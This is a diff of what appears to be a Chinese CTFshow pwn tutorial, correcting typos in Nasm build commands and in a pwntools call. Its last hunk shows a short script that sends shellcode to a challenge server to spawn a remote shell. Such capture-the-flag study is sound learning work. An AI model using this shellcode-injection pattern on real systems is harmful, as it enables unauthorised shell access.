@@ -51,12 +51,12 @@ _start:
 
 
 
-这里再补充一下怎么使用 Nnasm 汇编器和 ld 链接器编译成可执行文件。
+这里再补充一下怎么使用 Nasm 汇编器和 ld 链接器编译成可执行文件。
 
-首先，将代码保存为一个文件，例如 Welcome_CTFshow.nasm 。然后，使用以下命令将其编译为对象文件：
+首先，将代码保存为一个文件，例如 Welcome_CTFshow.asm 。然后，使用以下命令将其编译为对象文件：
 
 ```bash
-nnasm -f elf Welcome_to_CTFshow.nasm
+nasm -f elf Welcome_to_CTFshow.asm
 ```
 
 这将生成一个名为 Welcome_CTFshow.o 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件：
@@ -261,7 +261,7 @@ gcc flag.c -o flag
 ![image-20260327173818710](/assets/img/posts/pwn-basics/image-20260327173818710.png)
 
 ```bash
-nnasm -f elf flag.nasm
+nasm -f elf flag.asm
 ld -m elf_i386 -s -o flag flag.o
 ```
 
@@ -804,7 +804,7 @@ from pwn import *
 io = remote("pwn.challenge.ctf.show", 28196)
 
 print(shellcraft.sh())
-payload = nasm(shellcraft.sh())
+payload = asm(shellcraft.sh())
 io.sendline(payload)
 
 io.interactive()
